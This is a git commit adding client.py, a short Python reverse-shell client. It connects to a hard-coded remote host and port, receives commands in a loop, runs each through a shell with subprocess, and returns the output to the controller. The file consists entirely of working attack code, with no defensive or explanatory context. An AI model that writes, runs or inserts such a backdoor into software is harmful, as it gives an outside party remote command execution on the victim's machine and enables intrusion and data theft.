10f0ef9e51d342b9ade8a37933e65ed12402e085
Web Parser <119065387+W3bParserV2@users.noreply.github.com>
2022-11-25 23:28:31 +0100

    Add files via upload

---
+++ client.py
@@ -0,0 +1,19 @@
+import socket
+import subprocess
+
+REMOTE_HOST = '192.168.0.20' # '192.168.43.82'
+REMOTE_PORT = 8081 # 2222
+client = socket.socket()
+print("[-] Connection Initiating...")
+client.connect((REMOTE_HOST, REMOTE_PORT))
+print("[-] Connection initiated!")
+
+while True:
+    print("[-] Awaiting commands...")
+    command = client.recv(1024)
+    command = command.decode()
+    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    output = op.stdout.read()
+    output_error = op.stderr.read()
+    print("[-] Sending response...")
+    client.send(output + output_error)
